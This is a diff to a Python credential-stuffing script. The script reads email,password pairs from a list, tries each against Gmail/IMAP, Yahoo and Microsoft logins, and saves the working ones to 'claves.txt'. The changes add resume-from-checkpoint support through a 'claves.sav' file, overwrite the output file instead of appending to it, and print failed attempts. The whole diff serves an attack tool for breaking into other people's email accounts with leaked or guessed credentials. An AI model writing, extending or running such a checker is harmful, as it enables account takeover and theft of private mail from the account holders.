@@ -1,4 +1,5 @@
 #!/usr/bin/python
+import os
 import sys
 import threading
 import imaplib
@@ -15,21 +16,21 @@ def checklogin(email,contra,f,num):
 			f.write("\nemail:{0} password:{1}".format(email,contra))
 		else:
 			pass
-			#print("no Exito :( email:{0} password:{1}".format(email,contra))
+			print("no Exito :( email:{0} password:{1}".format(email,contra))
 	elif posY != -1:
 		if(checkLoginYahoo(email,contra)):
 			print("Exito Y :) email:{0} password:{1}".format(email,contra))
 			f.write("\nemail:{0} password:{1}".format(email,contra))
 		else:
 			pass
-			#print("no Exito :( email:{0} password:{1}".format(email,contra))
+			print("no Exito :( email:{0} password:{1}".format(email,contra))
 	else:
 		if (checkLoginMS(email,contra)):
 			print("Exito M :) email:{0} password:{1}".format(email,contra))
 			f.write("\nemail:{0} password:{1}".format(email,contra))
 		else:
 			pass
-			#print("no Exito :( email:{0} password:{1}".format(email,contra))
+			print("no Exito :( email:{0} password:{1}".format(email,contra))
 	num[0] -= 1
 
 def checkLoginYahoo(email,contra):
@@ -62,10 +63,23 @@ def checkLoginMS(email,contra):
 		return False
 
 if __name__ == "__main__":
+	save = "claves.sav"
 	inputTXT=sys.argv[1]
 	outputTXT="claves.txt"
+	flag = True
+	lineaSav = None
+	if os.path.isfile(save):
+		sav = open(save,"r")
+		lineaSav = sav.readline().strip("\n")
+		flag = False
+		if lineaSav == "":
+			flag = True
+		sav.close()
+		
+	else:
+		open(save,"w")
 	fil = open(inputTXT,"r")
-	datos = open(outputTXT,"a")
+	datos = open(outputTXT,"w")
 	lineas=fil.read().split('\n')
 	fichero = open(inputTXT, 'r')
 	numLineas = len(fichero.readlines())
@@ -73,14 +87,21 @@ if __name__ == "__main__":
 	num = [0]
 	for linea in lineas:
 		try:
-			linea=linea.split(',')
-			email=linea[0]
-			contra=linea[1]
-			checklogin(email,contra,datos,num)
+			if flag:
+				lineaRaw = linea
+				linea=linea.split(',')
+				email=linea[0]
+				contra=linea[1]
+				checklogin(email,contra,datos,num)
+				sav = open(save, "w")
+				sav.write(lineaRaw)
+				sav.close()
+			if linea == lineaSav and linea != "":
+				flag = True
 		except:
 			print(linea)
 		finally:
 			lineasActuales += 1
-			print("%{0}".format(float((100/numLineas)*lineasActuales)))
+			#print("%{0}".format(float((100/numLineas)*lineasActuales)))
 	eliminarRepetidos(inputTXT)
 	eliminarRepetidos(outputTXT)
